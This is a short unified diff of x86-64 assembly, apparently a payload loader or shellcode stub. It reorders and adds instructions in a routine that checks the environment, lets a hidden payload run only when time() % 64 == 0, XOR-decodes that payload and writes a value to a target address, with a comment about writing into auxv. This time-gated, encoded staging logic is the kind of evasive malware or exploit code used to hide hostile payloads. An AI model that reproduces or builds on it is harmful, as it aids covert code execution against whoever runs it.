@@ -40,19 +40,20 @@ env_check_loop:
     jmp env_check_loop
 
 env_check_okay:
-    // lea rdi, [rbx+(_end-_begin)+8]
-    .byte 0x48, 0x8d, 0x7b, (_end-_begin)+8
-    push rdi
-    /* Patch payload to only run at correct time. */
+    /* Patch payload to only run at correct time. rdi points to auxv (writable) */
+    nop
     call [rbx-8]
     /* Decode payload only when time() % 64 == 0 */
     test al, 63
+    // lea rdi, [rbx+(_end-_begin)+8]
+    .byte 0x48, 0x8d, 0x7b, (_end-_begin)+8
     movabs r11, VALUE_TO_WRITE
-    pop rdi
     jnz bye
+    imul eax, eax, 119
+    stosd
+    movabs r10, ADDR_TO_WRITE
     // Decode payload
     movqq rcx, (PAYLOAD_SIZE_IN_WORDS+1)
-    movabs r10, ADDR_TO_WRITE
     xor eax, eax
 decode_loop:
     xor [rdi+rcx*4], eax
